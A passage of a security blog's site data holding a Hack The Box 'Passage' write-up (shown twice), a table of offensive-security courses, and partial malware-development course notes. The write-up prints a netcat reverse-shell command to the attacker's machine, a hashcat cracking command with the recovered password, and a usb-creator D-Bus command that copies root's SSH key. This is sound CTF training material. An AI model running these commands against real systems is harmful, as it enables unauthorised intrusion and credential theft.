src=\"/assets/images/PassageHTB/cutenews.png\"></p>\n<p>First order of business was making this a reverse shell cause I can’t stand that default shell.<br>I ran nc -lnvp 9827 on my host kali machine and nc 10.10.<strong>.</strong> 9827 -e &#x2F;bin&#x2F;bash on the passage box</p>\n<hr>\n<p>PRO TIP: RUN THESE FOR AN ENJOYABLE EXPERIENCE IN YOUR SHELL</p>\n<pre><code class=\"hljs plaintext\">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</code></pre>\n<p>then</p>\n<pre><code class=\"hljs plaintext\">[CTRL-Z]\nstty raw -echo;fg\n[ENTER][ENTER]\n\nsource /etc/skel/.bashrc \nexport TERM=screen-256color</code></pre>\n<p>END OF PRO TIP </p>\n<hr>\n<p>At this point I got lost, that was until until I dig deeper and found &#x2F;var&#x2F;www&#x2F;html&#x2F;CuteNews&#x2F;cdata.<br>In this directory I fell into a rabbithole of writing a python script to base64 decode the hashes inside of these many files<br><img src=\"/assets/images/PassageHTB/base64.png\"></p>\n<p>For example, inside of one of those php files<br><img src=\"/assets/images/PassageHTB/1stphp.png\"><br>has the first line as garbage and the second line being a base64 string.<br>This script turned out to be for naught as the actual way to escalate privileges can be found inside the <strong>Lines</strong> file.<br><img src=\"/assets/images/PassageHTB/lines.png\"><br>if you go through and decode them you come across one that says <a href=\"mailto:&#x70;&#x61;&#117;&#108;&#x40;&#112;&#97;&#x73;&#x73;&#x61;&#x67;&#x65;&#46;&#104;&#116;&#98;\">&#x70;&#x61;&#117;&#108;&#x40;&#112;&#97;&#x73;&#x73;&#x61;&#x67;&#x65;&#46;&#104;&#116;&#98;</a> which is one of the two users I found when I was enumerating the home directory<br><img src=\"/assets/images/PassageHTB/homedir.png\"></p>\n<p>Then we throw that hash we found into a hash analyzer and realize it’s sha-256, well we could give it a shot cracking that hash to get his password.<br><img src=\"/assets/images/PassageHTB/analyzer.png\"></p>\n<p>We could easily enough crack it with hashcat but this online service did it in less than a second.<br><img src=\"/assets/images/PassageHTB/hashcrack.png\"><br>If you want to take a more manual approach with hashcat yourself you could do it with </p>\n<pre><code class=\"hljs plaintext\">hashcat -m 1400 paul.txt /usr/share/wordlists/rockyou.txt</code></pre>\n<p>at any rate you get atlanta1 as the password for paul<br>I enumerated as paul for a while until I eventually went into the .ssh dir and cated it all out,<br>I saw that nadav was in the authorized keys so while logged into paul I SSHd into nadav.<br><img src=\"/assets/images/PassageHTB/sshNadav.png\"></p>\n<p>Now out of all the privilege escalation i did for this box going from nadav to root was by far the hardest.<br>I always start out running a script that gives me a quick overview of the entire box very easily in case there’s something i can spot out of place. In this case it didn’t help all too much and I was left to exploring on my own</p>\n<p>fail2ban, zeitgeist, and CUPS were the first processes that I investigated but I didn’t come to any solution. I finally stumbled upon</p>\n<pre><code class=\"hljs plaintext\">/usr/bin/python3 /usr/share/usb-creator/usb-creator-helper</code></pre>\n<p>While looking at all the running processes.<br>I don’t remember having seen this before so I googled it and came across this article<br><a href=\"https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/\">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a><br>They describe how to exploit this to copy files to other </p>\n<pre><code class=\"hljs plaintext\">gdbus call --system --dest com.ubuntu.USBCREATOR --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true</code></pre>\n<p>This copies the root rsa key to &#x2F;tmp&#x2F;pwn on my box.<br>then we </p>\n<pre><code class=\"hljs plaintext\">chmod 600 root_id_rsa \nssh -i root_id_rsa root@10.10.10.206</code></pre>\n<p>And you can access root.txt<br>Thanks for reading!</p>\n","excerpt":"","more":"<p>This box was made by my buddy @ChefByzen on Twitter, I know him from our Uni CTF team. Very cool box!</p>\n<p>Let’s get into it.<br>I started off by enumerating like usual with NMAP</p>\n<pre><code class=\"hljs plaintext\"># Nmap 7.80 scan initiated Sat Sep 26 16:38:13 2020 as: nmap -sCV -p- -vvv -A -T4 -oA passage 10.10.10.206\nNmap scan report for 10.10.10.206\nPORT   STATE SERVICE REASON  VERSION\n22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVnCUEEK8NK4naCBGc9im6v6c67d5w/z/i72QIXW9JPJ6bv/rdc45FOdiOSovmWW6onhKbdUje+8NKX1LvHIiotFhc66Jih+AW8aeK6pIsywDxtoUwBcKcaPkVFIiFUZ3UWOsWMi+qYTFGg2DEi3OHHWSMSPzVTh+YIsCzkRCHwcecTBNipHK645LwdaBLESJBUieIwuIh8icoESGaNcirD/DkJjjQ3xKSc4nbMnD7D6C1tIgF9TGZadvQNqMgSmJJRFk/hVeA/PReo4Z+WrWTvPuFiTFr8RW+yY/nHWrG6LfldCUwpz0jj/kDFGUDYHLBEN7nsFZx4boP8+p52D8F\n|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCdB2wKcMmurynbHuHifOk3OGwNcZ1/7kTJM67u+Cm/6np9tRhyFrjnhcsmydEtLwGiiY5+tUjr2qeTLsrgvzsY=\n|   256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGRIhMr/zUartoStYphvYD6kVzr7TDo+gIQfS2WwhSBd\n80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Passage News\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n\n<p>Not much is open so I decided to check out the site<br>Immediately I see that they have fail2ban and another user kim switft</p>\n<pre><code class=\"hljs plaintext\">**Implemented Fail2Ban**\n18 Jun 2020 By admin 0 Comments\nDue to unusally large amounts of traffic, View &amp; Comment\nPhasellus tristique urna\n12 Jun 2020 By Kim Swift 0 Comments\nSed felis pharetra, nec sodales diam sagittis. View &amp; Comment</code></pre>\n\n<p>So gobuster is out of the question to enumerate directories.<br>I set out to investigate the site manually by playing around and I saw that it is powered by cutenews<br>After searching around I came across two exploits for it.<br>One was metasploit and the other someone had written a python script for after the box was released.<br>The author of the box says that the intended route is with metasploit.</p>\n<p>In either case you get a shell as www-data, we can’t get the flag just yet. We have to escalate privileges to get the user flag. </p>\n<p><img src=\"/assets/images/PassageHTB/cutenews.png\"></p>\n<p>First order of business was making this a reverse shell cause I can’t stand that default shell.<br>I ran nc -lnvp 9827 on my host kali machine and nc 10.10.<strong>.</strong> 9827 -e &#x2F;bin&#x2F;bash on the passage box</p>\n<hr>\n<p>PRO TIP: RUN THESE FOR AN ENJOYABLE EXPERIENCE IN YOUR SHELL</p>\n<pre><code class=\"hljs plaintext\">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</code></pre>\n<p>then</p>\n<pre><code class=\"hljs plaintext\">[CTRL-Z]\nstty raw -echo;fg\n[ENTER][ENTER]\n\nsource /etc/skel/.bashrc \nexport TERM=screen-256color</code></pre>\n<p>END OF PRO TIP </p>\n<hr>\n<p>At this point I got lost, that was until until I dig deeper and found &#x2F;var&#x2F;www&#x2F;html&#x2F;CuteNews&#x2F;cdata.<br>In this directory I fell into a rabbithole of writing a python script to base64 decode the hashes inside of these many files<br><img src=\"/assets/images/PassageHTB/base64.png\"></p>\n<p>For example, inside of one of those php files<br><img src=\"/assets/images/PassageHTB/1stphp.png\"><br>has the first line as garbage and the second line being a base64 string.<br>This script turned out to be for naught as the actual way to escalate privileges can be found inside the <strong>Lines</strong> file.<br><img src=\"/assets/images/PassageHTB/lines.png\"><br>if you go through and decode them you come across one that says <a href=\"mailto:&#x70;&#x61;&#117;&#108;&#x40;&#112;&#97;&#x73;&#x73;&#x61;&#x67;&#x65;&#46;&#104;&#116;&#98;\">&#x70;&#x61;&#117;&#108;&#x40;&#112;&#97;&#x73;&#x73;&#x61;&#x67;&#x65;&#46;&#104;&#116;&#98;</a> which is one of the two users I found when I was enumerating the home directory<br><img src=\"/assets/images/PassageHTB/homedir.png\"></p>\n<p>Then we throw that hash we found into a hash analyzer and realize it’s sha-256, well we could give it a shot cracking that hash to get his password.<br><img src=\"/assets/images/PassageHTB/analyzer.png\"></p>\n<p>We could easily enough crack it with hashcat but this online service did it in less than a second.<br><img src=\"/assets/images/PassageHTB/hashcrack.png\"><br>If you want to take a more manual approach with hashcat yourself you could do it with </p>\n<pre><code class=\"hljs plaintext\">hashcat -m 1400 paul.txt /usr/share/wordlists/rockyou.txt</code></pre>\n<p>at any rate you get atlanta1 as the password for paul<br>I enumerated as paul for a while until I eventually went into the .ssh dir and cated it all out,<br>I saw that nadav was in the authorized keys so while logged into paul I SSHd into nadav.<br><img src=\"/assets/images/PassageHTB/sshNadav.png\"></p>\n<p>Now out of all the privilege escalation i did for this box going from nadav to root was by far the hardest.<br>I always start out running a script that gives me a quick overview of the entire box very easily in case there’s something i can spot out of place. In this case it didn’t help all too much and I was left to exploring on my own</p>\n<p>fail2ban, zeitgeist, and CUPS were the first processes that I investigated but I didn’t come to any solution. I finally stumbled upon</p>\n<pre><code class=\"hljs plaintext\">/usr/bin/python3 /usr/share/usb-creator/usb-creator-helper</code></pre>\n<p>While looking at all the running processes.<br>I don’t remember having seen this before so I googled it and came across this article<br><a href=\"https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/\">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a><br>They describe how to exploit this to copy files to other </p>\n<pre><code class=\"hljs plaintext\">gdbus call --system --dest com.ubuntu.USBCREATOR --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true</code></pre>\n<p>This copies the root rsa key to &#x2F;tmp&#x2F;pwn on my box.<br>then we </p>\n<pre><code class=\"hljs plaintext\">chmod 600 root_id_rsa \nssh -i root_id_rsa root@10.10.10.206</code></pre>\n<p>And you can access root.txt<br>Thanks for reading!</p>\n"},{"layout":"single","title":"Personal Course Compendium (PCC)","date":"2022-12-05T05:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":" \n\nI'm starting this file as a tracking mechanism for courses I have completed and ones I am in the process of completing. \n\n---\n\n| Course        | Description/Skills Practiced | Status | Link|\n| ------------ | ------------ | --- | --- | \n| Certified Red Team Operator Courseware | \"Students will first cover the core concepts of adversary simulation, command & control, engagement planning and reporting. They will then go through each stage of the attack lifecycle - from initial compromise to full domain takeover, data hunting and exfiltration. Students will learn how common \"OPSEC failures\" can lead to detection by defenders, and how to carry out those attacks in a stealthier way. Finally, they will learn how to bypass defences such as Windows Defender, AMSI and AppLocker.\"   | Complete| https://training.zeropointsecurity.co.uk/courses/red-team-ops |\n| TCM Practical Ethical Hacking | I used this course to brush up before taking the PNPT exam. Topics include: common Active Directory attack and defense, exploiting the OWASP top 10, report writing, and recon | Complete | https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course -  Very, very old notes -> https://tkyn.dev/TCM-PEH-Course-Review+AD-Notes/| \n| TCM Windows Privilege Escalation | Addendum to the PNPT prep, revising previous notes. Topics include: Kernel Exploits, Password Hunting, Impersonation Attacks, Registry Attacks, Executable Files, Schedule Tasks, Startup Applications, DLL Hijacking, Service Permissions, Windows Subsystem for Linux | Complete | https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners | \n| TCM Linux Privilege Escalation | Additional revision for the PNPT exam. Topics include: Kernel Exploits, Password Hunting, File Permissions, Sudo Attacks, Shell Escaping, LD_PRELOAD, SUID Attacks, Shared Object Injection, Binary Symlinks, Environment Variables, Capabilities Attacks, Scheduled Tasks, NFS, Docker | Complete | https://academy.tcm-sec.com/p/linux-privilege-escalation | \n| TCM External Pentest Playbook | Introduction to external pentests, now completely overshadowed by my real life experience on clients. Topics include: Scope Verification and Client Communication, Vulnerability Scanning, Common OSINT and Information Gathering Techniques,  Attacking O365/OWA, Attacking Login Portals, Bypassing MFA and Escalating Access, Report Writing, Identifying Common Pentest Findings, Client Debriefs, Retests, and Attestations | Complete | https://academy.tcm-sec.com/p/external-pentest-playbook |\n| TCM Web Application Security and Testing | Intro to web app testing, more for refining my methodology than first exposure. From the course author \"... basics of HTTP, servers, and clients, before moving through the OWASP Top 10 on our way to a full demonstration penetration test. We also cover the reporting process for web application assessments ...\" | Complete | https://academy.tcm-sec.com/p/practical-web-application-security-and-testing | \n| x86 Assembly Language and Shellcoding on Linux | Haven't finished this course as of yet, good introduction and exercises for learning assembly. | 50% | https://www.pentesteracademy.com/course?id=3 - https://tkyn.dev/SLAE-x86-Assembly-and-Shellcoding-on-Linux-Notes/|\n| Sektor7 Malware Development Essentials | Haven't finished this course either, need to get more familiar with C. From the author: It will teach you how to develop your own custom malware for latest Microsoft Windows 10. And by custom malware we mean building a dropper for any payload you want (Metasploit meterpreter, Empire or Cobalt Strike beacons, etc.), injecting your shellcodes into remote processes, creating trojan horses (backdooring existing software) and bypassing Windows Defender AV. | 30% | https://institute.sektor7.net/red-team-operator-malware-development-essentials - https://tkyn.dev/Sektor7-Malware-Development-Course/ | \n\n\n![](/assets/images/PCC.png)\n","source":"_posts/2022-12-5-Personal-Course-Compendium-(PCC).md","raw":"---\nlayout: single\ntitle:  Personal Course Compendium (PCC)\ndate: 2022-12-5\nclasses: wide\nheader:\n  teaser: \ntags:\n  - Certification\n  - Review\n--- \n\nI'm starting this file as a tracking mechanism for courses I have completed and ones I am in the process of completing. \n\n---\n\n| Course        | Description/Skills Practiced | Status | Link|\n| ------------ | ------------ | --- | --- | \n| Certified Red Team Operator Courseware | \"Students will first cover the core concepts of adversary simulation, command & control, engagement planning and reporting. They will then go through each stage of the attack lifecycle - from initial compromise to full domain takeover, data hunting and exfiltration. Students will learn how common \"OPSEC failures\" can lead to detection by defenders, and how to carry out those attacks in a stealthier way. Finally, they will learn how to bypass defences such as Windows Defender, AMSI and AppLocker.\"   | Complete| https://training.zeropointsecurity.co.uk/courses/red-team-ops |\n| TCM Practical Ethical Hacking | I used this course to brush up before taking the PNPT exam. Topics include: common Active Directory attack and defense, exploiting the OWASP top 10, report writing, and recon | Complete | https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course -  Very, very old notes -> https://tkyn.dev/TCM-PEH-Course-Review+AD-Notes/| \n| TCM Windows Privilege Escalation | Addendum to the PNPT prep, revising previous notes. Topics include: Kernel Exploits, Password Hunting, Impersonation Attacks, Registry Attacks, Executable Files, Schedule Tasks, Startup Applications, DLL Hijacking, Service Permissions, Windows Subsystem for Linux | Complete | https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners | \n| TCM Linux Privilege Escalation | Additional revision for the PNPT exam. Topics include: Kernel Exploits, Password Hunting, File Permissions, Sudo Attacks, Shell Escaping, LD_PRELOAD, SUID Attacks, Shared Object Injection, Binary Symlinks, Environment Variables, Capabilities Attacks, Scheduled Tasks, NFS, Docker | Complete | https://academy.tcm-sec.com/p/linux-privilege-escalation | \n| TCM External Pentest Playbook | Introduction to external pentests, now completely overshadowed by my real life experience on clients. Topics include: Scope Verification and Client Communication, Vulnerability Scanning, Common OSINT and Information Gathering Techniques,  Attacking O365/OWA, Attacking Login Portals, Bypassing MFA and Escalating Access, Report Writing, Identifying Common Pentest Findings, Client Debriefs, Retests, and Attestations | Complete | https://academy.tcm-sec.com/p/external-pentest-playbook |\n| TCM Web Application Security and Testing | Intro to web app testing, more for refining my methodology than first exposure. From the course author \"... basics of HTTP, servers, and clients, before moving through the OWASP Top 10 on our way to a full demonstration penetration test. We also cover the reporting process for web application assessments ...\" | Complete | https://academy.tcm-sec.com/p/practical-web-application-security-and-testing | \n| x86 Assembly Language and Shellcoding on Linux | Haven't finished this course as of yet, good introduction and exercises for learning assembly. | 50% | https://www.pentesteracademy.com/course?id=3 - https://tkyn.dev/SLAE-x86-Assembly-and-Shellcoding-on-Linux-Notes/|\n| Sektor7 Malware Development Essentials | Haven't finished this course either, need to get more familiar with C. From the author: It will teach you how to develop your own custom malware for latest Microsoft Windows 10. And by custom malware we mean building a dropper for any payload you want (Metasploit meterpreter, Empire or Cobalt Strike beacons, etc.), injecting your shellcodes into remote processes, creating trojan horses (backdooring existing software) and bypassing Windows Defender AV. | 30% | https://institute.sektor7.net/red-team-operator-malware-development-essentials - https://tkyn.dev/Sektor7-Malware-Development-Course/ | \n\n\n![](/assets/images/PCC.png)\n","slug":"2022-12-5-Personal-Course-Compendium-(PCC)","published":1,"updated":"2024-07-24T16:20:44.842Z","comments":1,"photos":[],"_id":"clz07c5l5000im3cp4p2w53y6","content":"<p>I’m starting this file as a tracking mechanism for courses I have completed and ones I am in the process of completing. </p>\n<hr>\n<table>\n<thead>\n<tr>\n<th>Course</th>\n<th>Description&#x2F;Skills Practiced</th>\n<th>Status</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Certified Red Team Operator Courseware</td>\n<td>“Students will first cover the core concepts of adversary simulation, command &amp; control, engagement planning and reporting. They will then go through each stage of the attack lifecycle - from initial compromise to full domain takeover, data hunting and exfiltration. Students will learn how common “OPSEC failures” can lead to detection by defenders, and how to carry out those attacks in a stealthier way. Finally, they will learn how to bypass defences such as Windows Defender, AMSI and AppLocker.”</td>\n<td>Complete</td>\n<td><a href=\"https://training.zeropointsecurity.co.uk/courses/red-team-ops\">https://training.zeropointsecurity.co.uk/courses/red-team-ops</a></td>\n</tr>\n<tr>\n<td>TCM Practical Ethical Hacking</td>\n<td>I used this course to brush up before taking the PNPT exam. Topics include: common Active Directory attack and defense, exploiting the OWASP top 10, report writing, and recon</td>\n<td>Complete</td>\n<td><a href=\"https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course\">https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course</a> -  Very, very old notes -&gt; <a href=\"https://tkyn.dev/TCM-PEH-Course-Review+AD-Notes/\">https://tkyn.dev/TCM-PEH-Course-Review+AD-Notes/</a></td>\n</tr>\n<tr>\n<td>TCM Windows Privilege Escalation</td>\n<td>Addendum to the PNPT prep, revising previous notes. Topics include: Kernel Exploits, Password Hunting, Impersonation Attacks, Registry Attacks, Executable Files, Schedule Tasks, Startup Applications, DLL Hijacking, Service Permissions, Windows Subsystem for Linux</td>\n<td>Complete</td>\n<td><a href=\"https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners\">https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners</a></td>\n</tr>\n<tr>\n<td>TCM Linux Privilege Escalation</td>\n<td>Additional revision for the PNPT exam. Topics include: Kernel Exploits, Password Hunting, File Permissions, Sudo Attacks, Shell Escaping, LD_PRELOAD, SUID Attacks, Shared Object Injection, Binary Symlinks, Environment Variables, Capabilities Attacks, Scheduled Tasks, NFS, Docker</td>\n<td>Complete</td>\n<td><a href=\"https://academy.tcm-sec.com/p/linux-privilege-escalation\">https://academy.tcm-sec.com/p/linux-privilege-escalation</a></td>\n</tr>\n<tr>\n<td>TCM External Pentest Playbook</td>\n<td>Introduction to external pentests, now completely overshadowed by my real life experience on clients. Topics include: Scope Verification and Client Communication, Vulnerability Scanning, Common OSINT and Information Gathering Techniques,  Attacking O365&#x2F;OWA, Attacking Login Portals, Bypassing MFA and Escalating Access, Report Writing, Identifying Common Pentest Findings, Client Debriefs, Retests, and Attestations</td>\n<td>Complete</td>\n<td><a href=\"https://academy.tcm-sec.com/p/external-pentest-playbook\">https://academy.tcm-sec.com/p/external-pentest-playbook</a></td>\n</tr>\n<tr>\n<td>TCM Web Application Security and Testing</td>\n<td>Intro to web app testing, more for refining my methodology than first exposure. From the course author “… basics of HTTP, servers, and clients, before moving through the OWASP Top 10 on our way to a full demonstration penetration test. We also cover the reporting process for web application assessments …”</td>\n<td>Complete</td>\n<td><a href=\"https://academy.tcm-sec.com/p/practical-web-application-security-and-testing\">https://academy.tcm-sec.com/p/practical-web-application-security-and-testing</a></td>\n</tr>\n<tr>\n<td>x86 Assembly Language and Shellcoding on Linux</td>\n<td>Haven’t finished this course as of yet, good introduction and exercises for learning assembly.</td>\n<td>50%</td>\n<td><a href=\"https://www.pentesteracademy.com/course?id=3\">https://www.pentesteracademy.com/course?id=3</a> - <a href=\"https://tkyn.dev/SLAE-x86-Assembly-and-Shellcoding-on-Linux-Notes/\">https://tkyn.dev/SLAE-x86-Assembly-and-Shellcoding-on-Linux-Notes/</a></td>\n</tr>\n<tr>\n<td>Sektor7 Malware Development Essentials</td>\n<td>Haven’t finished this course either, need to get more familiar with C. From the author: It will teach you how to develop your own custom malware for latest Microsoft Windows 10. And by custom malware we mean building a dropper for any payload you want (Metasploit meterpreter, Empire or Cobalt Strike beacons, etc.), injecting your shellcodes into remote processes, creating trojan horses (backdooring existing software) and bypassing Windows Defender AV.</td>\n<td>30%</td>\n<td><a href=\"https://institute.sektor7.net/red-team-operator-malware-development-essentials\">https://institute.sektor7.net/red-team-operator-malware-development-essentials</a> - <a href=\"https://tkyn.dev/Sektor7-Malware-Development-Course/\">https://tkyn.dev/Sektor7-Malware-Development-Course/</a></td>\n</tr>\n</tbody></table>\n<p><img src=\"/assets/images/PCC.png\"></p>\n","excerpt":"","more":"<p>I’m starting this file as a tracking mechanism for courses I have completed and ones I am in the process of completing. </p>\n<hr>\n<table>\n<thead>\n<tr>\n<th>Course</th>\n<th>Description&#x2F;Skills Practiced</th>\n<th>Status</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Certified Red Team Operator Courseware</td>\n<td>“Students will first cover the core concepts of adversary simulation, command &amp; control, engagement planning and reporting. They will then go through each stage of the attack lifecycle - from initial compromise to full domain takeover, data hunting and exfiltration. Students will learn how common “OPSEC failures” can lead to detection by defenders, and how to carry out those attacks in a stealthier way. Finally, they will learn how to bypass defences such as Windows Defender, AMSI and AppLocker.”</td>\n<td>Complete</td>\n<td><a href=\"https://training.zeropointsecurity.co.uk/courses/red-team-ops\">https://training.zeropointsecurity.co.uk/courses/red-team-ops</a></td>\n</tr>\n<tr>\n<td>TCM Practical Ethical Hacking</td>\n<td>I used this course to brush up before taking the PNPT exam. Topics include: common Active Directory attack and defense, exploiting the OWASP top 10, report writing, and recon</td>\n<td>Complete</td>\n<td><a href=\"https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course\">https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course</a> -  Very, very old notes -&gt; <a href=\"https://tkyn.dev/TCM-PEH-Course-Review+AD-Notes/\">https://tkyn.dev/TCM-PEH-Course-Review+AD-Notes/</a></td>\n</tr>\n<tr>\n<td>TCM Windows Privilege Escalation</td>\n<td>Addendum to the PNPT prep, revising previous notes. Topics include: Kernel Exploits, Password Hunting, Impersonation Attacks, Registry Attacks, Executable Files, Schedule Tasks, Startup Applications, DLL Hijacking, Service Permissions, Windows Subsystem for Linux</td>\n<td>Complete</td>\n<td><a href=\"https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners\">https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners</a></td>\n</tr>\n<tr>\n<td>TCM Linux Privilege Escalation</td>\n<td>Additional revision for the PNPT exam. Topics include: Kernel Exploits, Password Hunting, File Permissions, Sudo Attacks, Shell Escaping, LD_PRELOAD, SUID Attacks, Shared Object Injection, Binary Symlinks, Environment Variables, Capabilities Attacks, Scheduled Tasks, NFS, Docker</td>\n<td>Complete</td>\n<td><a href=\"https://academy.tcm-sec.com/p/linux-privilege-escalation\">https://academy.tcm-sec.com/p/linux-privilege-escalation</a></td>\n</tr>\n<tr>\n<td>TCM External Pentest Playbook</td>\n<td>Introduction to external pentests, now completely overshadowed by my real life experience on clients. Topics include: Scope Verification and Client Communication, Vulnerability Scanning, Common OSINT and Information Gathering Techniques,  Attacking O365&#x2F;OWA, Attacking Login Portals, Bypassing MFA and Escalating Access, Report Writing, Identifying Common Pentest Findings, Client Debriefs, Retests, and Attestations</td>\n<td>Complete</td>\n<td><a href=\"https://academy.tcm-sec.com/p/external-pentest-playbook\">https://academy.tcm-sec.com/p/external-pentest-playbook</a></td>\n</tr>\n<tr>\n<td>TCM Web Application Security and Testing</td>\n<td>Intro to web app testing, more for refining my methodology than first exposure. From the course author “… basics of HTTP, servers, and clients, before moving through the OWASP Top 10 on our way to a full demonstration penetration test. We also cover the reporting process for web application assessments …”</td>\n<td>Complete</td>\n<td><a href=\"https://academy.tcm-sec.com/p/practical-web-application-security-and-testing\">https://academy.tcm-sec.com/p/practical-web-application-security-and-testing</a></td>\n</tr>\n<tr>\n<td>x86 Assembly Language and Shellcoding on Linux</td>\n<td>Haven’t finished this course as of yet, good introduction and exercises for learning assembly.</td>\n<td>50%</td>\n<td><a href=\"https://www.pentesteracademy.com/course?id=3\">https://www.pentesteracademy.com/course?id=3</a> - <a href=\"https://tkyn.dev/SLAE-x86-Assembly-and-Shellcoding-on-Linux-Notes/\">https://tkyn.dev/SLAE-x86-Assembly-and-Shellcoding-on-Linux-Notes/</a></td>\n</tr>\n<tr>\n<td>Sektor7 Malware Development Essentials</td>\n<td>Haven’t finished this course either, need to get more familiar with C. From the author: It will teach you how to develop your own custom malware for latest Microsoft Windows 10. And by custom malware we mean building a dropper for any payload you want (Metasploit meterpreter, Empire or Cobalt Strike beacons, etc.), injecting your shellcodes into remote processes, creating trojan horses (backdooring existing software) and bypassing Windows Defender AV.</td>\n<td>30%</td>\n<td><a href=\"https://institute.sektor7.net/red-team-operator-malware-development-essentials\">https://institute.sektor7.net/red-team-operator-malware-development-essentials</a> - <a href=\"https://tkyn.dev/Sektor7-Malware-Development-Course/\">https://tkyn.dev/Sektor7-Malware-Development-Course/</a></td>\n</tr>\n</tbody></table>\n<p><img src=\"/assets/images/PCC.png\"></p>\n"},{"layout":"single","title":"Sektor7 Malware Development Course, Notes and Thoughts in Progress","date":"2022-07-07T04:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":" \n\n## Thoughts\nOverall it seems to be a very well put together, useful, and informative. \n\nCurrently my skills with C++ aren't up to snuff to keep up with so I will be returning to this once I have more knowledge under my belt. \nHere are some rough notes taken while attempting to get though the intro to the course.\n\n## Notes\n1-4 videos:\nLearned about PE-Bear, structure of PE programs.\nDifference between how DLL and EXE are executed and used\nand general housekeeping, setting up the environment\n\nVideos 5-6:\ncompiling CPP code through powershell script\ncompiling CPP code with DLL main function to compile code into a DLL\nexploring output in process hacker\nDLLs cannot live in memory alone, rundll32 allows you to, also dumpbin important\ndroppers, where to store payloads within PE files. Have shellcode that launches calc\nText, data and resources sections in PE files are places to store shellcode/payload\n\nVideos 7-8:\n7: learned  about storing payloads in the text section of executables by storing shellcode in local variables. stepped through the instructions with x64dbg to further cement understanding of allocating memory for shellcode, making it readable and executable and finally creating a thread to execute it\n\n8: storing payloads in the data section of the executable by initializing them as global variables instead. otherwise the process of allocating memory and otherwise is unchanged\n(learn more cpp and interacting with windows api and understand virtualalloc in more depth)\n\nThanks for reading! \n","source":"_posts/2022-7-7-Sektor7 Malware Development Course.md","raw":"---\nlayout: single\ntitle:  Sektor7 Malware Development Course, Notes and Thoughts in Progress\ndate: 2022-7-7\nclasses: wide\nheader:\n  teaser: \ntags:\n  - pwn\n  - Certification\n--- \n\n## Thoughts\nOverall it seems to be a very well put together, useful, and informative. \n\nCurrently my skills with C++ aren't up to snuff to keep up with so I will be returning to this once I have more knowledge under my belt. \nHere are some rough notes taken while attempting to get though the intro to the course.\n\n## Notes\n1-4 videos:\nLearned about PE-Bear, structure of PE programs.\nDifference between how DLL and EXE are executed and used\nand general housekeeping, setting up the environment\n\nVideos 5-6:\ncompiling CPP code through powershell script\ncompiling CPP code with DLL main function to compile code into a DLL\nexploring output in process hacker\nDLLs cannot live in memory alone, rundll32 allows you to, also dumpbin important\ndroppers, where to store payloads within PE files. Have shellcode that launches calc\nText, data and resources sections in PE files are places to store shellcode/payload\n\nVideos 7-8:\n7: learned  about storing payloads in the text section of executables by storing shellcode in local variables. stepped through the instructions with x64dbg to further cement understanding of allocating memory for shellcode, making it readable and executable and finally creating a thread to execute it\n\n8: storing payloads in the data section of the executable by initializing them as global variables instead. otherwise the process of allocating memory and otherwise is unchanged\n(learn more cpp and interacting with windows api and understand virtualalloc in more depth)\n\nThanks for reading! \n","slug":"2022-7-7-Sektor7 Malware Development Course","published":1,"updated":"2024-07-24T16:20:44.842Z","comments":1,"photos":[],"_id":"clz07c5l7000km3cp46jn25s9","content":"<h2 id=\"Thoughts\"><a href=\"#Thoughts\" class=\"headerlink\" title=\"Thoughts\"></a>Thoughts</h2><p>Overall it seems to be a very well put together, useful, and informative. </p>\n<p>Currently my skills with C++ aren’t up to snuff to keep up with so I will be returning to this once I have more knowledge under my belt.<br>Here are some rough notes taken while attempting to get though the intro to the course.</p>\n<h2 id=\"Notes\"><a href=\"#Notes\" class=\"headerlink\" title=\"Notes\"></a>Notes</h2><p>1-4 videos:<br>Learned about PE-Bear, structure of PE programs.<br>Difference between how DLL and EXE are executed and used<br>and general housekeeping, setting up the environment</p>\n<p>Videos 5-6:<br>compiling CPP code through powershell script<br>compiling CPP code with DLL main function to compile code into a DLL<br>exploring output in process hacker<br>DLLs cannot live in memory alone, rundll32 allows you to, also dumpbin important<br>droppers, where to store payloads within PE files. Have shellcode that launches 